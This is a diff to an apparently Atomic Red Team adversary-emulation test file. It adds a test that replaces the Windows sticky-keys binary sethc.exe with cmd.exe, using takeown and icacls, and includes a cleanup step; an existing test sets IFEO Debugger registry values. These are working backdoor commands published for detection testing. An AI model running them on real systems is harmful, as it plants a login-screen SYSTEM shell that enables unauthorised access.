@@ -25,7 +25,7 @@ atomic_tests:
       $input_table = "#{parent_list}".split(",")
       $Name = "Debugger"
       $Value = "#{attached_process}"
-      Foreach ($item in $input_table){   
+      Foreach ($item in $input_table){
         $item = $item.trim()
         $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$item"
         IF(!(Test-Path $registryPath))
@@ -47,4 +47,19 @@ atomic_tests:
       }
     name: powershell
     elevation_required: true
-
+- name: Replace binary of sticky keys
+  auto_generated_guid: 934e90cf-29ca-48b3-863c-411737ad44e3
+  description: |
+    Replace sticky keys binary (sethc.exe) with cmd.exe
+  supported_platforms:
+  - windows
+  executor:
+    command: |
+      copy C:\Windows\System32\sethc.exe C:\Windows\System32\sethc_backup.exe
+      takeown /F C:\Windows\System32\sethc.exe /A
+      icacls C:\Windows\System32\sethc.exe /grant Administrators:F /t
+      copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+    cleanup_command: |
+      copy /Y C:\Windows\System32\sethc_backup.exe C:\Windows\System32\sethc.exe
+    name: command_prompt
+    elevation_required: true
